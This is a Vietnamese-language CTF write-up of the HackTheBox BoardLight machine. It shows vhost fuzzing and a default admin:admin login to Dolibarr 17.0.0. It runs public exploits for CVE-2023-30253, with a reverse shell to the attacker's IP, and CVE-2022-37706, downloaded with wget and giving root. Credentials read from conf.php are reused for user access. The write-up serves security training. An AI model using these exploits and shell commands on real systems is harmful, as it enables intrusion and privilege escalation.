---
layout: post
author: Neo
title: HackTheBox - BoardLight
date: 2024-05-28
tags:
  - web
  - linux
  - dolibarr
  - mysql
  - ssh
  - enlightenment_sys
  - hackthebox
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2024-05-28-HTB-BoardLight/intro.png)

BroadLight là một máy đơn giản tập trung vào cách tìm kiếm lỗ hổng và sử dụng các PoC của nó để thực hiện tấn công và leo thang đặc quyền. Ngoài ra nội dung của máy này cũng đưa ra cảnh báo về sự nguy hiểm của việc sử dụng thông tin đăng nhập mặc định và sử dụng chung password giữa các service khác nhau trong hệ thống.

## Reconnaissance and Scanning

```python
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Truy cập vào port 80, tôi có một trang web giới thiệu. Lướt qua toàn bộ nó, ở phần cuối cùng xuất hiện 1 domain.

![one](/assets/img/2024-05-28-HTB-BoardLight/1.jpg)

Thêm domain này vào file host. Truy cập lại thì cũng không có gì thay đổi. Tuy nhiên, khi có domain thì tôi sẽ nghĩ đến việc tìm subdomain hoặc vhost

Sử dụng ffuf

```python
┌──(kali㉿kali)-[~/HTB/BoardLight]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.board.htb" -u http://board.htb -t 30                       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

12                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 99ms]
16                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 93ms]
19                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 93ms]
a.auth-ns               [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 176ms]
0                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 182ms]
10                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 182ms]
a                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 183ms]
1                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 185ms]
01                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 185ms]
14                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 184ms]
13                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 184ms]
a01                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 208ms]
5                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 209ms]
11                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 209ms]
18                      [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 212ms]
9                       [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 216ms]
a02                     [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 216ms]
```

Tất cả đều là có thể truy cập được, điều này không đúng lắm. Khi sử dụng burpsuite để kiếm tra độ dài của response thì tôi nhận được kết quả cũng là 15949 giống với size mà ffuf đã quét ra được.

Tôi sẽ sử dụng thêm 1 vài options để bỏ qua tất cả các kết quả có size:15949 vì tôi biết chắc chắn nó không đúng. 

Tôi sẽ thêm *-o* để ffuf ghi kết quả ra file và dùng *grep* để lấy ra các kết quả không phải là 15949

```python
┌──(kali㉿kali)-[~/HTB/BoardLight]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.board.htb" -u http://board.htb -t 30 -o - | grep -v "15949"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.board.htb
 :: Output file      : -
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 121ms]
```

Thêm nó vào file host và truy cập crm.board.htb

![two](/assets/img/2024-05-28-HTB-BoardLight/2.jpg)

## Enumeration

Tôi có 1 form đăng nhập và có 1 cái tên Dolibarr 17.0.0. Đây có thể là trình quản trị của site này và phiên bản của nó.

Thử đăng nhập với những tài khoản đơn giản thì tôi không ngờ là có thể truy cập được với **admin:admin**. Tuy nhiên thì sau khi truy cập, tôi cũng không làm thêm được gì bởi vì user này không có quyền quản trị. 

Tìm kiếm các exploit của dolibarr 17.0.0 thì tôi nhận được [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253). Clone nó về và exploit theo hướng dẫn thôi

```python
┌──(kali㉿kali)-[~/HTB/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.57 5555 
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

Quay trở lại listener

```python
┌──(kali㉿kali)-[~/HTB/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.16.57] from (UNKNOWN) [10.10.11.11] 53084
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

Thực sự thì tôi không có hiểu biết cũng như kinh nghiệm sử dụng Dolibarr này, nên tôi đã nhờ đến sự giúp đỡ của Chatgpt để tìm kiếm các thông tin đăng nhập được lưu trên mã nguồn

![three](/assets/img/2024-05-28-HTB-BoardLight/3.jpg)

Thử tìm file này trong mã nguồn 

```python
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat ../../conf/conf.php
<.htb/htdocs/public/website$ cat ../../conf/conf.php            
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='*************';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

## User flag

Vậy là tôi có thông tin để đăng nhập vào mysql. Tuy nhiên trước khi đăng nhập mysql thì tôi hay thử thêm 1 hướng nữa là sử dụng password của mysql để truy cập vào user xem có được không

Và boom! Password của mysql cũng là password của user

```python
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ su larissa
su larissa
Password: 
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/public/website$ id
id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/public/website$ 
```

Quay sang ssh luôn cho thuận tiện, user flag cũng nằm ở đây

```python
larissa@boardlight:~$ ls
Desktop  Documents  Downloads  exploit.sh  linpeas.sh  Music  Pictures  Public  sc.sh  Templates  user.txt  Videos
```

## Privilege escalation

Sau khi thử tất cả các cách thông thường đều không có kết quả, tôi phải tải *linpeas* lên máy để phân tích.

Sau khi chạy linpeas, tôi nhận được một vài kết quả bất thường trong phần SUID

```python
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                                             
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                                                                                                                    
-rwsr-sr-x 1 root root 15K Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

Thử tìm kiếm thông tin các exploit hoặc CVE về **enlightenment_sys**, tôi tìm thấy [CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). Clone nó về và tải exploit lên máy

```python
┌──(kali㉿kali)-[~/HTB/BoardLight]
└─$ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
Cloning into 'CVE-2022-37706-LPE-exploit'...
remote: Enumerating objects: 92, done.
remote: Counting objects: 100% (92/92), done.
remote: Compressing objects: 100% (92/92), done.
remote: Total 92 (delta 32), reused 14 (delta 0), pack-reused 0
Receiving objects: 100% (92/92), 498.76 KiB | 938.00 KiB/s, done.
Resolving deltas: 100% (32/32), done.
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/BoardLight]
└─$ cd CVE-2022-37706-LPE-exploit      
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/BoardLight/CVE-2022-37706-LPE-exploit]
└─$ ll
total 20
-rwxrwxr-x 1 kali kali  709 Jun  2 14:03 exploit.sh
-rw-rw-r-- 1 kali kali 2014 Jun  2 14:03 PublicReferenceURL.txt
-rw-rw-r-- 1 kali kali 7119 Jun  2 14:03 README.md
drwxrwxr-x 2 kali kali 4096 Jun  2 14:03 screenshots
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/BoardLight/CVE-2022-37706-LPE-exploit]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Trên máy, tải exploit về và chạy thử

```python
larissa@boardlight:~$ wget http://10.10.16.57:8080/exploit.sh
--2024-06-02 10:59:14--  http://10.10.16.57:8080/exploit.sh
Connecting to 10.10.16.57:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                                      100%[====================================================================================================================================================>]     709  --.-KB/s    in 0.05s   

2024-06-02 10:59:14 (13.1 KB/s) - ‘exploit.sh’ saved [709/709]

larissa@boardlight:~$ chmod +x exploit.sh
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# 
```
